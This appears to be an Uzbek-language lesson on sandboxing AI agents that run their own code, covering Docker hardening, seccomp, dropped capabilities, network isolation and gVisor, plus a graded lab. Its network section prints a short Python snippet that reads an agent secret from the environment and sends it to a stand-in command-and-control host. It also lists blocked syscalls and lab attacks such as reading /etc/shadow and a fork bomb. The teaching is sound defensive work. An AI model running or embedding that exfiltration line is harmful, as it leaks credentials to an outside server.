AI Agent Sandboxing va RCE Himoyasi: Xavfsiz Kod Bajarish

14 va 16-darslarda siz til modellariga asboblar (Tool Calling) berdingiz va Prompt Injection hujumlarini o'rgandingiz. Lekin avtonom AI agentiga o'zi yozgan kodni (Python/Bash) bajarish huquqi berilsa nima bo'ladi? Standart xost tizimi 2 soniyada RCE (Remote Code Execution) xurujiga uchraydi. Bugun biz ko'p qatlamli xavfsiz izolyatsiya perimetrini quramiz: Docker Hardening, Seccomp, Linux Capabilities va gVisor mikroyadrosi.

Konteyner xavfsizligi xatosi

Nega Oddiy `docker run` Yetarli Emas?

Xost Bilan Bitta Yadro 🧬

Konteynerlar virtual mashina emas! Ular bitta Linux yadrosida ishlaydi. Yadrodagi 1 ta xato = butun server xaker qo'lida.

Ichkaridagi Root = Tashqaridagi Root ⚠️

Sukut bo'yicha Docker root (UID 0) bilan ishlaydi. docker.sock ulanib qolsa, server 1 soniyada xakerga o'tadi.

Konteynerdan Qochish (CVE) 🚪

runc dagi haqiqiy kiber-zaifliklar jarayonni konteyner panjarasidan to'g'ridan-to'g'ri xostga chiqarib yuboradi.

Minimal huquqlar qoidasi

1-Qatlam: Ruxsatsiz User va Read-Only Tizim

Oddiy Foydalanuvchi (UID 10001)

Agent kodini hech qachon root ostida bajarmang. Minimal UID yarating:

RUN useradd -u 10001 -m sandbox USER 10001:10001 # Лишает доступа к /etc/shadow, /boot и raw-сокетам

Faqat O'qish Uchun Tizim (--read-only)

Diskka yozishni to'xtating. Xaker backdoor qoldira olmaydi:

docker run --read-only \ --tmpfs /tmp:rw,noexec,nosuid,size=64m \ agent-runner:latest
Yadro imtiyozlarini cheklash

2-Qatlam: Linux Capabilities va Seccomp

Barcha Imtiyozlarni O'chirish ✂️

Linux root vakolatlarini alohida huquqlarga bo'ladi. Agentga ularning hech biri kerak emas:

docker run --cap-drop=ALL \ --security-opt=no-new-privileges:true

SUID orqali root huquqlarini o'g'irlashni butunlay to'xtatadi.

Tizimli So'rovlar Filtratsiyasi (Seccomp) 🛡️

Yadro 450 ta so'rovni qabul qiladi. Seccomp faqat 50 ta zarursizini qoldiradi:

--security-opt seccomp=strict-profile.json # Запрещены: ptrace, bpf, mount, reboot, kexec_load
Tarmoq sizishi va C2 ga qarshi

3-Qatlam: Tarmoqni 100% Uzish (Egress Kill)

Xaker Ma'lumotni Qanday O'g'irlaydi?

Root huquqisiz ham skript maxfiy tokenlarni o'qib, o'z serveriga jo'natishi mumkin:

import os, urllib.request token = os.environ.get('AGENT_SECRET') urllib.request.urlopen(f'http://c2.hacker.ru/{token}')

Yechim: --network=none

Ma'lumotlarni qayta ishlash uchun internet umuman kerak emas. Tarmoqni uzing:

docker run --network=none python:3.11-slim # Результат: OSError: [Errno 101] Network is unreachable # Reverse Shell мгновенно нейтрализован!
Bulutli xavfsizlik standarti

Mikroyadrolar va MicroVMs: gVisor & Firecracker

Google gVisor (runsc) 🛡️

  • Operatsion tizim yadrosi xotirasi xavfsiz Go tilida foydalanuvchi makonida qayta yozilgan.
  • Konteyner hech qachon xost yadrosiga to'g'ridan-to'g'ri tegmaydi.
  • Google Cloud Run va AI platformalarining asosi.

AWS Firecracker MicroVM ⚡

  • KVM apparat virtualizatsiyasi asosidagi yengil virtual mashina.
  • >5 millisekundda ishga tushadi va atigi 5 MB RAM sarflaydi!
  • Haqiqiy apparat chegarasi: virtual tizim buzilsa ham xostga o'tmaydi.
Amaliy poligon

Sandboxing Lab: 6 Ta Himoya To'sig'ini Sinang

1. Beshta Hujum 🎯

/etc/shadow o'qish, C2 reverse shell, fayl o'chirish, fork-bomba va xavfsiz analitika.

2. Himoya Kalitlari 🎛️

Ketma-ket yoqing: Non-Root, Read-Only, Drop Caps, Network Kill, cheklovlar va gVisor.

3. Audit va Telemetriya 📊

Terminalda xatolarni ko'ring, zararlanish radiusini o'lchang va sertifikat oling.

Dars topshirig'i (12 daqiqa)

Xavfsizlik Muhandisining 4 Ta Kvesti

1-Kvest: Himoyasiz Tizimni Buzish (2.5 b)

  • Tizimni himoyasiz qoldirib, parollarni o'g'irlash kodini bajaring.
  • Terminalda xeshlar chiqqanini ko'rib, varaqaga yozing.

2-Kvest: Non-Root va Read-Only (2.5 b)

  • Non-Root va Read-Only kalitlarini yoqing.
  • Fayllarni o'chirishda Permission Denied xatosini oling.

3-Kvest: Tarmoqni To'xtatish (2.5 b)

  • --network=none ni yoqib, C2 ulanish hujumini qaytaring.
  • Network is unreachable xatosini qayd eting.

4-Kvest: To'liq Qattiq Himoya (2.5 b)

  • Barcha 6 ta to'siqni yoqing, fork-bombani to'xtating.
  • 10/10 ballik Xavfsizlik Muhandisi Sertifikatiga ega bo'ling.
